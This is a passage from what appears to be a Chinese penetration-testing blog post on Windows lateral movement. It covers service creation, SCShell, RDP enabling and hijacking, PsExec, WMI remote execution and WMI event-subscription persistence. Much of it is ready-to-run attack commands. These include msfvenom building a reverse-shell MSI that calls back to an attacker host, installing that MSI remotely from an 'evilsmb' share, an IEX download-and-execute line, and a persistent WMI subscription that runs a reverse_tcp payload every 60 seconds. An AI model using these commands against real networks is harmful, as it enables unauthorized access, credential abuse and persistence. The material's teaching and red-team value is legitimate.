<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.111.135 start Backcdoor</span><br></pre></td></tr></tbody></table></figure>


</li>
<li><p>攻击结束后，将创建的服务删除</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.111.135 delete Backdoor</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h3 id="SCShell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h3><p><strong>SCShell</strong>是一款利用系统服务的无文件横向移动工具。与传统的创建远程服务的方法不同，<strong>SCShell</strong>利用提供的用户凭据，通过<strong>ChangeServiceConfigA API</strong>修改远程主机上的服务配置，将服务的二进制路径名修改为指定的程序或攻击载荷，然后重启服务。执行结束后，服务二进制路径将恢复为原始路径。<br><strong>SCShell</strong>需要提供远程主机的管理员权限用户的凭据，并且需要已知远程主机上的系统服务名称。方法如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCShell.exe 10.10.10.19 XblAuthManager "C:\Windows\System32\cmd.exe /c calc" hack-my.com Administrator Admin@123</span><br><span class="line"># SCShell.exe  &lt;Target&gt; &lt;Service Name&gt; &lt;Payload&gt; &lt;Domain&gt; &lt;Username&gt; &lt;Password&gt; </span><br></pre></td></tr></tbody></table></figure>

<p>下面通过<strong>Regsvr32</strong>执行外部SCT文件的方式上线远程主机</p>
<ol>
<li>通过<strong>MetaSploit</strong>启动一个<strong>Web Delivery</strong>，并生成用于<strong>Regsvr32</strong></li>
</ol>
<h3 id="UAC-Remote-Restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h3><p><strong>UAC</strong>（用户账户控制）使计算机用户能够以非管理员身份执行日常任务。本地管理员组中任何非<strong>RID 500</strong>的其他管理员用户也将使用最小权限原则运行大多数应用程序，具有类似标准用户的权限。当执行需要管理员权限的任务时，<strong>Windows</strong>会自动提示用户予以批准。<br>为了更好地保护属于本地管理员组成员的用户，微软在<strong>Windows Vista</strong>以后的操作系统中引入了<strong>UAC Remote Restrictions</strong>（远程限制）。此机制有助于防止本地恶意软件以管理权限远程运行。因此，如果测试人员使用计算机本地用户进行需要管理员权限的远程管理操作，无论是<strong>schtasks</strong>还是后面要讲到的<strong>PsExec</strong>、<strong>WMI</strong>、<strong>WinRM</strong>、哈希传递攻击，都只能使用<strong>RID500</strong>（<strong>Administrator</strong>）的本地管理员用户，使用其他任何用户包括非<strong>RID 500</strong>的本地管理员用户都会提示“拒绝访问”。<br>注意，<strong>UAC Remote Restrictions</strong>只限制本地用户，域管理员用户不受限制，因此会在很大程度上限制工作组环境中的横向移动。有条件的可以通过执行以下命令并重启系统来关闭<strong>UAC Remote Restrictions</strong>。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></tbody></table></figure>





<h2 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h2><p>远程桌面协议（<strong>Remote Desktop Protocol，RDP</strong>）是微软从<strong>Windows Server 2000</strong>开始提供的功能，用户可以通过该功能登录并管理远程主机，所有操作就像在自己的计算机上操作一样。远程桌面协议默认监听<strong>TCP3389</strong>端口。</p>
<p>利用远程桌面进行横向移动是常见的方法。当内网中的其他主机开启了远程桌面服务后，测试人员可以通过已获取的用户凭据，借助内网代理等技术进行远程登录，通过远程桌面服务对目标主机进行实时操作。但是这种方法可能将已登录的用户强制退出，容易被管理员发现。</p>
<h3 id="远程桌面的确定和开启"><a href="#远程桌面的确定和开启" class="headerlink" title="远程桌面的确定和开启"></a>远程桌面的确定和开启</h3><p>执行以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections</span><br></pre></td></tr></tbody></table></figure>

<p>通过查询注册表来确定当前主机是否开启了远程桌面功能。若字段值为0（即图中的0x0），则说明<strong>RDP</strong>服务以启动，若为1，则说明<strong>RDP</strong>服务已禁用。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231109221525101.png" alt="image-20231109221525101" style="zoom: 67%;">

<p>执行以下命令，可在本地开启远程桌面功能</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#开启远程桌面连接功能</span><br><span class="line">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权） </span><br><span class="line">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\winstations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0</span><br><span class="line"></span><br><span class="line">#设置防火墙策略放行3389端口</span><br><span class="line">netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></tbody></table></figure>

<p>对于远程主机，可以通过<strong>WMI</strong>来开启远程桌面功能</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /Node:192.168.111.135 /User:Administrator /Password:1qaz@WSX RDTOGGLE WHERE ServerName='JOHN' call SetAllowTSConnections 1</span><br></pre></td></tr></tbody></table></figure>

<p>需要指定远程主机的IP、主机名和用户凭据</p>
<h3 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h3><p>对于开启远程桌面服务的<strong>Windows</strong>计算机，当多个用户进行登录时，会产生多个会话。渗透测试人员可以通过已获取的<strong>SYSTEM</strong>权限劫持其他用户的<strong>RDP</strong>会话，并在未授权的情况下成功登入目标系统，即使该用户的会话已断开。这种攻击方法被称为**<code>RDP Hijacking</code><strong>（</strong>远程桌面劫持**），于2017年由以色列安全研究员Alexander Korznikov在个人博客中披露。</p>
<p>远程桌面劫持需要获取系统<strong>SYSTEM</strong>权限并执行<strong>tscon</strong>命令。该命令提供了一个切换用户会话的功能。在正常情况下，切换会话时需要提供目标用户的登录密码，但在<strong>SYSTEM</strong>权限下能够完全绕过验证，不输入密码即可切换到目标用户的会话，从而实现未授权登录。读者可以自行阅读相关文章，以了解更多细节。<br>例如，测试人员获取到了某台主机的普通用户权限，并以该用户成功登录远程桌面，然后执行<code>query user</code>命令，发现该主机上还存在其他用户的会话记录。其中，<strong>Marcus</strong>和<strong>Administrator</strong>用户的会话已断开，<strong>Vincent</strong>用户的会话为活跃状态。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231126135558486.png" alt="image-20231126135558486" style="zoom:130%;">

<p>此时，如果可以通过提权方法获取系统<strong>SYSTEM</strong>权限，就可以在不提供其他用户登录凭据的情况下劫持用户的<strong>RDP</strong>会话。在<strong>Meterpreter</strong>中提权至<strong>SYSTEM</strong>权限后，执行以下命令，<strong>rdesktop</strong>成功切换到<strong>Administrator</strong>用户的桌面。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231126135625403.png" alt="image-20231126135625403" style="zoom:150%;">

<h3 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h3><p><strong>SharpRDP</strong>是一款开源工具，可以通过远程桌面协议在远程主机上执行系统命令，且不需<strong>GUI</strong>客户端。该工具需要远程主机开启远程桌面功能，并且防火墙放行<strong>3389</strong>端口。<br>通常在内网渗透时，如果想登录一台内网主机的远程桌面，需要先搭建内网代理，然后使用<strong>RDP</strong>客户端进行连接。但是，测试人员可以直接将<strong>SharpRDP</strong>上传到跳板机，然后获取到的用户凭据，对内网其他主机执行系统命令。这样就省去了内网代理等中间环节。了解更多关于<strong>SharpRDP</strong>工具的细节，请阅读相关文章。</p>
<h2 id="PsExec远程控制"><a href="#PsExec远程控制" class="headerlink" title="PsExec远程控制"></a>PsExec远程控制</h2><p><strong>PsExec</strong>是微软官方提供的一款实用的<strong>Windows</strong>远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性。<strong>PsExec</strong>最强大的功能之一就是可以在远程系统中启动交互式命令提示窗口，以便实时显示有关远程系统的信息。<br><strong>PsExec</strong>原理是通过<strong>SMB</strong>连接到服务端的<code>Admin$</code>共享，并释放名为<strong>psexesvc.exe</strong>的二进制文件，然后注册名为<strong>PSEXESVC</strong>服务。当客户端执行命令时，服务端通过<strong>PSEXESVC</strong>服务启动相应的程序执行命令并回显数据。运行结束后，<strong>PSEXESVC</strong>服务会被删除用<strong>PsExec</strong>进行远程操作需要具备以下条件：</p>
<ol>
<li>远程主机开启了<code>Admin$</code>共享</li>
<li>远程主机未开启防火墙或放行<strong>445</strong>端口。执行以下命令：</li>
</ol>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe</span><br><span class="line"># -accepteula，禁止弹出许可证对话框；-u，指定远程主机的用户名；-p，指定用户的密码</span><br><span class="line"># -s，以SYSTEM权限启动进程，如果未指定该参数，就将以管理员权限启动进程</span><br></pre></td></tr></tbody></table></figure>

<p>用域管理员用户的凭据连接远程主机（<strong>10.10.10.19</strong>），并以<strong>SYSTEM</strong>权限启动一个交互式命令行</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231126170234479.png" alt="image-20231126170234479" style="zoom:80%;">

<p>在内网渗透中，如果已有相应凭据，那么可以直接使用<strong>PsExec</strong>连接远程主机</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula \\192.168.54.136 cmd.exe</span><br></pre></td></tr></tbody></table></figure>

<p><strong>Impacket</strong>和<strong>Metasploit</strong>都内置了基于<strong>PsExec</strong>执行远程命令的脚本或模块，如<strong>Impacke</strong>中的<strong>psexec.py</strong>脚本、<strong>Metasploit</strong>中的<code>exploit/windows/smb/psexec</code>模块都可以完成相同的操作。读者可以在本地自行测试，这里不再赘述。</p>
<h2 id="WMI的利用"><a href="#WMI的利用" class="headerlink" title="WMI的利用"></a>WMI的利用</h2><p><strong>WMI</strong>（<strong>Windows Management Instrumentation , Windows</strong>管理规范）是一项核心的<strong>Windows</strong>管理技术。用户可以通过<strong>WMI</strong>管理本地和远程计算机。<strong>Windows</strong>为远程传输<strong>WMI</strong>数据提供了两个可用的协议，即分布式组件对象模型（<strong>Distributed Component Object Model , DCOM</strong>）和<strong>Windows</strong>远程管理（<strong>Windows Remote Management , WinRM</strong>），使得<strong>WMI</strong>对象的查询、事件注册、<strong>WMI</strong>类方法的执行和类的创建等操作都能够远程进行。<br>在横向移动时，测试人员可以利用<strong>WMI</strong>提供的管理功能，通过已v的用户凭据，与本地或远程主机进行交互，并控制其执行各种行为。目前有两种常见的利用方法：一是通过调用<strong>WMI</strong>的类进行远程执行，如<strong>Win32_Process</strong>类中的<strong>Create</strong>方法可以在远程主机上创建进程，<strong>Win32 Product</strong>类中的<strong>Install</strong>方法可以在远程主机上安装恶意的<strong>MSI</strong>，二是远程部署<strong>WMI</strong>事件订阅，在特定条的事件发生时触发攻击。<br>利用<strong>WMI</strong>进行横向移动需要具备以下条件：</p>
<ol>
<li>远程主机的<strong>WM</strong>征服务为开启状态（默认开启）；</li>
<li>远程主机防火墙放行<strong>135</strong>端口，这是<strong>WMI</strong>管理的默认端口。</li>
</ol>
<h4 id="常规利用方法"><a href="#常规利用方法" class="headerlink" title="常规利用方法"></a>常规利用方法</h4><p>在<strong>Windows</strong>上可以通过<strong>wmic.exe</strong>和<strong>PowerShell Cmdlet</strong>来使用<strong>WMI</strong>数据和执行<strong>WMI</strong>方法。<strong>Wmic.exe</strong>是一个与<strong>WMI</strong>进行交互的强大的命令行工具，拥有大量的<strong>WMI</strong>对象的默认别名，可以执行许多复杂的查询。<strong>Windows PowerShell</strong>也提供了许多可以与<strong>WMI</strong>进行交互的<strong>Cmdlet</strong>，如<strong>Invoke-WmiMethod</strong>、<strong>Set-WmiInstance</strong>等。</p>
<h5 id="1-执行远程查询"><a href="#1-执行远程查询" class="headerlink" title="1.执行远程查询"></a>1.执行远程查询</h5><p>执行以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.111.136 /user:Administrator /password:Admin@123 process list brief </span><br><span class="line">#/node，指定远程主机的地址；/user，指定远程主机的用户名；/password，指定用户的密码</span><br></pre></td></tr></tbody></table></figure>

<p>通过<strong>WMIC</strong>查询远程主机（<strong>192.168.111.136</strong>）上运行的进程信息</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127104603826.png" alt="image-20231127104603826" style="zoom:120%;">

<h5 id="2-创建远程进程"><a href="#2-创建远程进程" class="headerlink" title="2.创建远程进程"></a>2.创建远程进程</h5><p>执行以下命令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:190.168.111.136 /user:Administrator /password:Admin@123 process call create "cmd.exe /c ipconfig &gt; C:\result.txt"</span><br></pre></td></tr></tbody></table></figure>

<p>通过调用<strong>Win32_Process.Create</strong>方法在远程主机上创建进程，启动<strong>CMD</strong>来执行系统命令</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127105257089.png" alt="image-20231127105257089" style="zoom:120%;">

<p>由于<strong>WMIC</strong>在执行命令时没有回显，因此可以将执行结果写入文件，然后通过建立共享连接等方式使用<strong>type</strong>命令远程读取</p>
<h5 id="3-远程安装MSI文件"><a href="#3-远程安装MSI文件" class="headerlink" title="3.远程安装MSI文件"></a>3.远程安装MSI文件</h5><p>通过调用<strong>Win32_Product.Install</strong>方法，可以控制远程主机安装恶意的<strong>MSI（Microsoft Installer）</strong>文件，从而获取其权限。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127105516687.png" alt="image-20231127105516687" style="zoom:120%;">



<ol>
<li><p>使用<strong>MetaSploit</strong>生成一个恶意的<strong>MSI</strong>文件</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f msi -o reverse_tcp.msi</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>在一台测试人员可控的服务器上搭建<strong>SMB</strong>共享服务器，并将生成的<strong>MSI</strong>文件放入共享目录</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127105921853.png" alt="image-20231127105921853" style="zoom:120%;">
</li>
<li><p>在跳板机上执行以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 product call install PackageLocation="\\192.168.2.143\evilsmb\reverse_tcp.msi"</span><br></pre></td></tr></tbody></table></figure>

<p>控制远程主机（<strong>10.10.10.19</strong>），通过<strong>UNC</strong>路径进行远程加载测试人员服务器的<strong>MSI</strong>文件并进行安装，成功获取远程主机的权限。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127110246177.png" alt="image-20231127110246177" style="zoom:130%;"></li>
</ol>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127110308355.png" alt="image-20231127110308355" style="zoom:120%;">





<h3 id="常见利用工具"><a href="#常见利用工具" class="headerlink" title="常见利用工具"></a>常见利用工具</h3><h5 id="1-Wmiexec"><a href="#1-Wmiexec" class="headerlink" title="1.Wmiexec"></a>1.Wmiexec</h5><p><strong>Impacket</strong>项目的<strong>wmiexec.py</strong>能够以全交互或半交互的方式，通过<strong>WMI</strong>在远程主机上执行命令。注意，该工具需要远程主机开启<strong>135</strong>和<strong>445</strong>端口，其中<strong>445</strong>端口用于传输命令执行的回显。<br>执行以下命令，获取远程主机的交互式命令行</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py HACK-MY/Administrator:Admin\@123@10.10.10.19</span><br><span class="line"># python wmiexec.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;IP&gt;</span><br></pre></td></tr></tbody></table></figure>

<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127111115193.png" alt="image-20231127111115193" style="zoom:130%;">

<p>如果是在<strong>Windows</strong>平台上使用，可以通过<strong>PyInstaller</strong>，将<strong>wmiexec.py</strong>打包成独立的<strong>exe</strong>可执行文件：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 安装PyInstaller模块</span><br><span class="line">pip3 Install pyinstaller</span><br><span class="line"># 进入wmiexec.py所在目录并执行打包操作，将在dist目录中生成wmiexec,exe </span><br><span class="line">cd impacket\examples </span><br><span class="line">pyinstaller -F wmiexec.py</span><br></pre></td></tr></tbody></table></figure>

<p>打包完成后，生成的<strong>wmiexec.exe</strong>可直接上传到<strong>Windows</strong>主机中运行，使用方法与原来的<strong>wmiexec.py</strong>相同，结果如图5-6-8所示</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127111755713.png" alt="image-20231127111755713" style="zoom:130%;">



<h5 id="2-Invoke-WmiCommand"><a href="#2-Invoke-WmiCommand" class="headerlink" title="2.Invoke-WmiCommand"></a>2.Invoke-WmiCommand</h5><p><strong>Invoke-WmiCommand.ps1 <strong>是 <strong>PowerSploit <strong>项目中的一个脚本，可以通过</strong>PowerShell</strong>调用</strong>WMI</strong>来远程执行命令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 远程加载Invoke-WmiCommand.ps1脚本</span><br><span class="line">IEX(New-object Net.Webclient).Downloadstring('http://IP:Port/Invoke-WmiCommand.ps1')</span><br><span class="line"># 指定远程系统用户名</span><br><span class="line">$User = "HACK-MY\Administrator"</span><br><span class="line"># 指定用户的密码</span><br><span class="line">$Password = ConvertTo-SecureString -String "Admin@123" -AsPlainText -Force</span><br><span class="line"># 将用户名和密码整合，以便导入Credential </span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line"># 指定远程主机的IP和要执行的命令</span><br><span class="line">$Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName "10.10.10.19"</span><br><span class="line"># 输出命令执行回显</span><br><span class="line">$Remote.PayloadOutput</span><br></pre></td></tr></tbody></table></figure>

<p>执行成功后，可以得到结果回显</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127170101806.png" alt="image-20231127170101806" style="zoom:120%;">

<p>此外，<strong>PowerShell</strong>内置的<strong>Invoke-WMIMethod</strong>也可以在远程系统中执行命令或程序，但是没有执行回显。具体使用方法请读者自行查阅相关资料。</p>
<h4 id="WMI事件订阅的利用"><a href="#WMI事件订阅的利用" class="headerlink" title="WMI事件订阅的利用"></a>WMI事件订阅的利用</h4><p><strong>WMI</strong>提供了强大的事件处理系统，几乎可以用于对操作系统上发生的任何事件做出响应。例如，当创建某进程时，通过<strong>WMI</strong>事件订阅来执行预先设置的脚本。其中，触发事件的具体条件被称为“事件过滤器”（<strong>Event Filter</strong>），如用户登录、新进程创建等，对指定事件发生做出的响应被称为“事件消费者”（<strong>Event Consumer</strong>），包括一系列具体的操作，如运行脚本、记录日志、发送邮件等。在部署事件订阅时，需要分别构建<strong>Filter</strong>和<strong>Consumer</strong>两部分，并将二者绑定在一起。<br>所有的事件过滤器都被存储为一个<code>ROOT\subscription:__EventFilter</code>对象的实例，可以通过创建<code>__EventFilter</code>对象实例来部署事件过滤器。事件消费者是基于<code>ROOT\subscription:__EventConsumer</code>系统类派生来的类。系统提供了常用的标准事件消费类，如需了解更多细节，读者可以查阅微软提供的相关文档。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127171329285.png" alt="image-20231127171329285" style="zoom:120%;">

<p>测试人员可以使用<strong>WMI</strong>的功能在远程主机上部署永久事件订阅，并在特定事件发生时执行任意代码或系统命令。使用<strong>WMI</strong>事件消费类的<strong>ActiveScriptEventConsumer</strong>和<strong>CommandLineEventConsumer</strong>，可以在远程主机上执行任何攻击载荷。该技术主要用来在目标系统上完成权限持久化，亦可用于横向移动，并且需要提供远程主机的管理员权限的用户凭据。</p>
<h5 id="1-手动利用"><a href="#1-手动利用" class="headerlink" title="1.手动利用"></a>1.手动利用</h5><p>下面通过手动执行<strong>PowerShell</strong>命令来讲解利用工程</p>
<ol>
<li><p>整合<strong>PSCredentical</strong>，用于后续过程认证</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$Username = "HACK-MY\Administrator"</span><br><span class="line">$Password = "Admin@123"</span><br><span class="line">$SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="line">$Credential = New-object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>设置攻击目标和其他公共参数</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$GlobalArgs=e@{}</span><br><span class="line">$ComputerName = "10.10.10.19"</span><br><span class="line">$GlobalArgs['Credential']= $Credential</span><br><span class="line">$GlobalArgs['ComputerName'] = $ComputerName</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>在远程主机（<strong>10.10.10.19</strong>）上部署“<strong>TestFilter</strong>”事件过滤器，用于查询<strong>svchost.exe</strong>进程的产生。由于<strong>WMI</strong>所有的事件过滤器都被存储为<strong>ROOT\subscription:__EventFilter</strong>对象的实例，因此通过<strong>Set-WmiInstance Cmdlet</strong>创建一个**__EventFilter**类的实例即可。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$EventFilterArgs = @{</span><br><span class="line">	EventNamespace = 'root/cimv2'</span><br><span class="line">	Name = "TestFilter"</span><br><span class="line">	Query = "SELECT * FROM Win32_ProcessStartTrace where processname ='svchost.exe'"</span><br><span class="line">	QueryLanguage = 'WQL'</span><br><span class="line">}</span><br><span class="line">$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>在远程主机上部署一个名为<strong>TestConsumer</strong>的事件消费者，创建事件消费类<strong>CommandLineEventConsumer</strong>的实例，在指定事件发生时执行系统命令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$CommandLineEventConsumerArgs = @{</span><br><span class="line">	Name = "TestConsumer"</span><br><span class="line">	CommandLineTemplate = "C：\Windows\System32\cmd.exe /c calc.exe"</span><br><span class="line">}</span><br><span class="line">$EventConsumer = Set-WmiInstance -Namespace root\subscription -class </span><br><span class="line">	CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>将创建的事件过滤器和事件消费者绑定在一起</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$FilterConsumerBindingArgs = @{</span><br><span class="line">	Filter $EventFilter </span><br><span class="line">	Consumer = $EventConsumer</span><br><span class="line">}</span><br><span class="line">$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -class</span><br><span class="line">	__FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs</span><br></pre></td></tr></tbody></table></figure>

<p>到此，已经成功在远程主机（<strong>10.10.10.19</strong>）上部署了一个事件订阅，当远程系统轮询到<strong>svchost.exe</strong>进程产生时，将通过事件消费者执行系统命令来启动<strong>calc.exe</strong>进程。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127173914387.png" alt="image-20231127173914387" style="zoom:130%;"></li>
</ol>
<h5 id="2-Sharp-WMIEvent"><a href="#2-Sharp-WMIEvent" class="headerlink" title="2.Sharp-WMIEvent"></a>2.Sharp-WMIEvent</h5><p>完整的利用过程可以整合为<strong>PowerShell</strong>脚本（<strong>Sharp-WMIEvent</strong>，见Github的相关网页），下面简单演示使用方法。</p>
<ol>
<li><p>在一台测试人员可控的服务器上搭建<strong>SMB</strong>共享服务器，并将生成的攻击载荷放入共享目录</p>
</li>
<li><p>在跳板机上执行以下命令，运行<strong>Sharp-WMIEvent</strong></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 10.10.10.19 -Domain hack-my.com -Username Administrator -Password Admin@123 -Command "cmd.exe /c \\10.10.10.147\evilsmb\reverse_tcp.exe"</span><br></pre></td></tr></tbody></table></figure>

<p>这将在远程主机上部署一个随机命名的永久事件订阅，并每隔60秒执行一次<strong>SMB</strong>共享中的攻击载荷，使远程主机上线。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127203758369.png" alt="image-20231127203758369" style="zoom:120%;"></li>
</ol>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127203823306.png" alt="image-20231127203823306" style="zoom:120%;">





<h2 id="DCOM的利用"><a href="#DCOM的利用" class="headerlink" title="DCOM的利用"></a>DCOM的利用</h2><h3 id="COM和DCOM"><a href="#COM和DCOM" class="headerlink" title="COM和DCOM"></a>COM和DCOM</h3><h5 id="1-com"><a href="#1-com" class="headerlink" title="1.com"></a>1.com</h5><p><strong>COM</strong>（<strong>Component Object Model</strong>，组件对象模型）是微软的一套软件组件的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。<strong>COM</strong>是多项微软技术与框架的基础，包括<strong>OLE</strong>、<strong>OLE</strong>自动化、<strong>ActiveX</strong>、<strong>COM</strong>+、<strong>DCOM</strong>、<strong>Windows Shell</strong>, <strong>DirectX</strong>、<strong>Windows Runtime</strong>。</p>
